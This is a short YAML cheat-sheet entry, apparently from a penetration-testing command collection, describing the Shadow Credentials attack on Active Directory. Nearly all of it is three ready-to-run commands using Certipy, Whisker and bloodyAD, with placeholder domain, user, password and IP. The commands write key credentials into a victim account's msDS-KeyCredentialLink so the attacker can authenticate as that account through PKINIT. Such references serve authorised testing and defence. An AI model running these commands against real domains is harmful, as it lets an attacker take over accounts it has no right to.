---
description: |
  Shadow Credentials attack — abuse msDS-KeyCredentialLink to add key credentials and authenticate as the target account via PKINIT.
commands:
  - have: Credentials
    cmd: |
      certipy shadow auto -target dc01.senshu.local -u sec_user@senshu.local -p 'P@ssw0rd' -account victim
      .\Whisker.exe add /target:victim /domain:senshu.local /dc:dc01.senshu.local
      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials victim
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - ACL_Abuse
references:
  - https://github.com/ly4k/Certipy
  - https://github.com/eladshamir/Whisker
  - https://github.com/CravateRouge/bloodyAD
---
